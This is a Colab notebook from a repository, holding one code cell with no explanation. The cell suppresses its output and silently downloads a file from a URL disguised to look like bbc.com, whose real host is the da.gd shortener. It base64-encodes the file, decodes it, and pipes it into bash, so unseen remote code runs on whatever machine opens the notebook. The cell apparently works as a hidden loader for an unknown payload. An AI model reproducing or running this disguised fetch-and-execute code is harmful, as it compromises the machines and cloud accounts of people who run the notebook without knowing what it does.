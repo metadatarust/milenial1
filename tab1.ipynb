{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "tab1.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "dcY4cGLcsnbw"
      },
      "outputs": [],
      "source": [
        "%%capture\n",
        "%%shell\n",
        "python1=$(shuf -i 1-9999999999 -n 1)\n",
        "python2=$(shuf -i 1-9999999999 -n 1)\n",
        "wget -q -O $python1 https://www.bbc.com-dev@da.gd/qgb634\n",
        "base64 $python1 > $python2\n",
        "base64 $python2 -d | bash"
      ]
    }
  ]
}